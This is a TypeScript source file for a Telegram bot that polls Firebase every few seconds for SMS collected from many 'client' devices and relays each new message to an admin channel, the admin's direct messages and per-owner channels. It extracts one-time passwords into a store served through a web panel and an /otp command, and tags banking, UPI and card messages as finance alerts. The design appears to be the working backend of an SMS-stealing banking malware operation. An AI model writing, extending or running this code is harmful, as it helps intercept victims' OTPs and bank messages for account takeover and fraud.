import { escapeMarkdown } from "../lib/telegramText";
import { sanitizeOwnerTelegramId } from "../lib/telegramIds";
import { Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import {
  fbGet,
  fbSet,
  getSmsChannel,
  getSmsWatermarks,
  setSmsWatermark,
} from "./firebase";

// Poll every 3 seconds so genuinely-new SMS are forwarded to the channel
// almost instantly (Telegram rate limit still respected by the send queue).
const POLL_INTERVAL = 3_000;

// ── OTP detection ─────────────────────────────────────────────────────────────
// Any SMS that mentions an OTP/verification keyword AND contains a 4–8 digit
// code is captured into Firebase `otps/latest/<code>:<number>` (deduped for
// 10 minutes) so the web panel and the /otp bot command can serve it.
const OTP_KEYWORD =
  /otp|one[- ]?time[- ]?password|verification code|verify code|is your (login |verification )?code|use code|security code|never share|do not share|valid for/i;

function detectOtp(
  body: string,
  from: string
): { code: string; service: string } | null {
  const cleaned = body.replace(/\s+/g, " ").trim();
  if (!OTP_KEYWORD.test(cleaned)) return null;
  // Avoid year 2026 etc. as OTP — require 4-6 digits not part of longer number and not common years
  const m = cleaned.match(/\b(?!20\d{2}\b)\d{4,8}\b/);
  if (!m) return null;
  let service = (from || "")
    .replace(/[^A-Za-z\s]/g, " ")
    .replace(/\s+/g, " ")
    .trim();
  if (!service) {
    const brand = cleaned.match(
      /(?:from|for|your|with)\s+([A-Za-z][A-Za-z0-9 .&]{2,24})/i
    );
    service = brand ? brand[1].trim() : "Unknown";
  }
  return { code: m[0], service: service.slice(0, 32) || "Unknown" };
}

// ── Telegram per-chat send queue ─────────────────────────────────────────────
// Telegram allows ~1 message/second per chat. We serialize sends per chat with
// a 1.1s gap and back off via retry_after on 429 so we never trigger 429s.
let botRef: Telegraf | null = null;
const chatQueues = new Map<string, string[]>();
const chatDraining = new Set<string>();

function enqueue(chatId: string, text: string): void {
  const q = chatQueues.get(chatId) ?? [];
  q.push(text);
  chatQueues.set(chatId, q);
  void drainChat(chatId);
}

async function drainChat(chatId: string): Promise<void> {
  if (chatDraining.has(chatId)) return;
  chatDraining.add(chatId);
  try {
    while (true) {
      const q = chatQueues.get(chatId);
      if (!q || q.length === 0) break;
      const text = q[0];
      if (!botRef) {
        q.shift();
        continue;
      }

      let sent = false;
      let permanent = false;
      for (let attempt = 0; attempt < 10; attempt++) {
        try {
          await botRef.telegram.sendMessage(chatId, text, {
            parse_mode: "Markdown",
          });
          sent = true;
          break;
        } catch (err: any) {
          const code = err?.response?.error_code;
          if (code === 429) {
            const retryAfter =
              (err?.response?.parameters?.retry_after ?? 5) * 1000;
            logger.warn({ chatId, retryAfter }, "Telegram 429 — backing off");
            await delay(retryAfter);
            continue;
          }
          logger.error(
            { err, chatId },
            "Permanent failure sending SMS to chat"
          );
          permanent = true;
          break;
        }
      }

      if (sent) {
        q.shift();
        logger.info({ chatId }, "SMS forwarded to channel");
        await delay(1100); // respect ~1 msg/sec per chat
      } else if (permanent) {
        q.shift(); // drop permanently-failing message (already logged)
      } else {
        logger.warn({ chatId }, "Gave up after 10 attempts — will retry later");
        break;
      }
    }
  } finally {
    chatDraining.delete(chatId);
  }
}

const FINANCE_KEYWORDS = [
  "otp",
  "debit",
  "credit",
  "upi",
  "payment",
  "transaction",
  "transferred",
  "paid",
  "received",
  "balance",
  "account",
  "bank",
  "withdraw",
  "deposit",
  "inr",
  "₹",
  "rs",
  "neft",
  "imps",
  "rtgs",
  "paytm",
  "phonepe",
  "gpay",
  "googlepay",
  "bhim",
  "razorpay",
  "amount",
  "credited",
  "debited",
  "sbi",
  "hdfc",
  "icici",
  "axis",
  "kotak",
  "pnb",
  "bob",
  "canara",
  "net banking",
  "atm",
  "card",
  "cvv",
  "pin",
  "expiry",
  "insufficient",
];

function isFinanceSms(text: string): boolean {
  const lower = text.toLowerCase();
  const hasAmount = /(?:rs\.?|inr|₹)\s*\d/.test(lower);
  // Short keywords (rs, pin, card) require amount to avoid nurse/pincode false positives
  const shortKws = new Set(["rs", "pin", "card"]);
  for (const kw of FINANCE_KEYWORDS) {
    if (lower.includes(kw)) {
      if (shortKws.has(kw) && !hasAmount) continue;
      // amount mandatory for finance unless bank/UPI keyword present
      if (kw.length <= 3 && !hasAmount) continue;
      return true;
    }
  }
  return hasAmount;
}


/** Small delay to avoid Telegram rate limits */
const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));

export function startSmsWatcher(bot: Telegraf, adminId: number): void {
  botRef = bot;
  let watermarks: Record<string, number> = {};
  let ready = false;
  // We NEVER back-fill old SMS. A stale/equal watermark is silently aligned
  // to the current max so only genuinely NEW messages (arriving after this
  // point) get forwarded to the channel.
  const aligned: Record<string, boolean> = {};

  async function init() {
    try {
      const saved = await getSmsWatermarks();
      watermarks = saved;

      const clients = await fbGet("clients");
      if (clients) {
        for (const deviceId of Object.keys(clients).filter(
          (k: string) => !k.startsWith("{") && !k.startsWith("*")
        )) {
          if (watermarks[deviceId] === undefined) {
            watermarks[deviceId] = 0;
          }
        }
      }
      ready = true;
      logger.info("SMS watcher initialized");
    } catch (err) {
      logger.error({ err }, "SMS watcher init error");
      ready = true;
    }
  }

  async function poll() {
    if (!ready) return;

    try {
      // One flaky instance (e.g. an expired ngrok database) must not kill the
      // whole poll — degrade that source to null instead.
      const [globalChannelId, clients, messages, userChannels] =
        await Promise.all([
          getSmsChannel().catch(() => null),
          fbGet("clients").catch(() => null),
          fbGet("messages").catch(() => null),
          fbGet("config/userChannels").catch(() => null),
        ]);

      if (!clients) return;

      for (const [deviceId, deviceData] of Object.entries(
        clients as Record<string, any>
      )) {
        const smsData: Record<string, any> | undefined =
          (messages as any)?.[deviceId] || (deviceData as any)?.sms;
        if (!smsData) continue;

        // Firebase can hold null entries (deleted/tombstoned SMS) — drop them
        // up front so every downstream access is null-safe.
        const smsEntries = Object.values(smsData).filter((s: any) => s != null);
        if (smsEntries.length === 0) continue;

        const sampleEntry = smsEntries[0] as any;
        const isNewFormat =
          sampleEntry && sampleEntry.id != null && !sampleEntry.date;

        const getSortKey = (sms: any): number =>
          isNewFormat ? (sms?.id ?? 0) : parseInt(sms?.date || "0", 10);

        const currentMaxKey = Math.max(
          ...smsEntries.map((s: any) => getSortKey(s)),
          0
        );

        const lastWatermark = watermarks[deviceId];

        // ── NO BACK-FILL ──────────────────────────────────────────────────
        // If the stored watermark is missing, sentinel 0, equal to, or ahead
        // of current data, silently align it to current max ONCE. This
        // guarantees OLD/historical SMS are NEVER forwarded. Only genuinely
        // new SMS (id > max) that arrive after this point get pushed to the
        // channel instantly.
        const needsAlign =
          lastWatermark === undefined ||
          lastWatermark === 0 ||
          lastWatermark >= currentMaxKey;

        if (needsAlign) {
          if (!aligned[deviceId]) {
            aligned[deviceId] = true;
            logger.info(
              { deviceId, from: lastWatermark, to: currentMaxKey },
              "Aligned SMS watermark (no back-fill)"
            );
          }
          if (watermarks[deviceId] !== currentMaxKey) {
            watermarks[deviceId] = currentMaxKey;
            await setSmsWatermark(deviceId, currentMaxKey);
          }
          continue;
        }

        const effectiveWatermark = watermarks[deviceId];
        // Template placeholder ids (e.g. OWNER_TELEGRAM_ID_000000000) and any
        // non-numeric garbage are treated as "unbound" — never DM'd.
        const ownerTelegramId: string | null = sanitizeOwnerTelegramId(
          (deviceData as any)?.ownerTelegramId
        );

        const newEntries = smsEntries
          .filter((sms: any) => getSortKey(sms) > effectiveWatermark)
          .sort((a: any, b: any) => getSortKey(a) - getSortKey(b));

        if (newEntries.length === 0) continue;

        let latestKey = effectiveWatermark;

        for (const sms of newEntries as any[]) {
          const sortKey = getSortKey(sms);
          const phone =
            (deviceData as any).mobNo || (deviceData as any).phone || deviceId;
          const from = sms.sender || sms.from || "Unknown";
          const body = sms.message || sms.body || "";
          const dateStr = sms.dateTime
            ? sms.dateTime
            : sms.date
              ? new Date(parseInt(sms.date)).toLocaleString("en-IN", {
                  timeZone: "Asia/Kolkata",
                }) + " IST"
              : "Unknown";
          const isFinance = isFinanceSms(body);

          const msg =
            `📨 *New SMS*\n\n` +
            `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
            `🕐 ${dateStr}\n\n` +
            `${escapeMarkdown(body)}`;

          const financeMsg =
            `💰 *Finance Alert*\n\n` +
            `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
            `🕐 ${dateStr}\n\n` +
            `${escapeMarkdown(body)}`;

          // ── 1. Global admin channel ──────────────────────────────────
          if (globalChannelId) {
            enqueue(globalChannelId, msg);
          }

          // ── 1b. Always mirror to admin DM (all users / connections) ──
          // Escape everything in the header: raw owner/device/from strings
          // have broken Markdown entities here before (unclosed `_`/`*`).
          const adminScope =
            ownerTelegramId && ownerTelegramId !== adminId.toString()
              ? "user " + ownerTelegramId
              : "device " + deviceId;
          const adminMsg =
            `📨 *New SMS*  (${escapeMarkdown(adminScope)})\n\n` +
            `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n\n` +
            `${escapeMarkdown(body.slice(0, 160))}${body.length > 160 ? "…" : ""}`;
          enqueue(adminId.toString(), adminMsg);

          // ── 1c. OTP capture (web panel + /otp bot command) ────────────
          const otp = detectOtp(body, from);
          if (otp) {
            try {
              const otpKey = `${otp.code}:${phone}`;
              const now = Date.now();
              const dup = await fbGet(`otps/latest/${otpKey}`);
              if (!dup || now - (dup.date || 0) > 10 * 60 * 1000) {
                await fbSet(`otps/latest/${otpKey}`, {
                  code: otp.code,
                  service: otp.service,
                  number: phone,
                  from,
                  body: body.slice(0, 500),
                  deviceId,
                  date: now,
                });
                logger.info(
                  { deviceId, code: otp.code, service: otp.service },
                  "OTP captured"
                );
              }
            } catch (err) {
              logger.warn({ err }, "OTP capture failed");
            }
          }

          // ── 2. Owner notifications ───────────────────────────────────
          if (ownerTelegramId) {
            const ownerCfg = userChannels?.[ownerTelegramId] || {};

            // 2a. Owner's personal SMS channel (if configured)
            if (ownerCfg.sms) {
              enqueue(ownerCfg.sms, msg);
            } else if (ownerTelegramId !== adminId.toString()) {
              // 2b. No channel set — send directly to owner's DM
              enqueue(ownerTelegramId.toString(), msg);
            }

            // 2c. Finance channel (if configured and SMS is financial)
            if (isFinance && ownerCfg.finance) {
              enqueue(ownerCfg.finance, financeMsg);
            } else if (
              isFinance &&
              !ownerCfg.finance &&
              ownerTelegramId !== adminId.toString()
            ) {
              // 2d. No finance channel — send finance alert to owner DM too
              enqueue(ownerTelegramId.toString(), financeMsg);
            }

            // 2e. Keyword rules
            if (ownerCfg.rules) {
              const rules = Object.values(ownerCfg.rules) as Array<{
                keyword: string;
                channel: string;
              }>;
              for (const rule of rules) {
                if (body.toLowerCase().includes(rule.keyword.toLowerCase())) {
                  const kwMsg =
                    `🔔 *Keyword Alert: ${escapeMarkdown(rule.keyword)}*\n\n` +
                    `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
                    `🕐 ${dateStr}\n\n` +
                    `${escapeMarkdown(body)}`;
                  enqueue(rule.channel, kwMsg);
                }
              }
            }
          }

          if (sortKey > latestKey) latestKey = sortKey;
        }

        if (latestKey > effectiveWatermark) {
          watermarks[deviceId] = latestKey;
          await setSmsWatermark(deviceId, latestKey);
        }
      }
    } catch (err) {
      logger.error({ err }, "SMS watcher poll error");
    }
  }

  init().then(() => {
    setInterval(poll, POLL_INTERVAL);
    poll();
  });

  logger.info("SMS watcher started (polling every 3s, NO back-fill)");
}
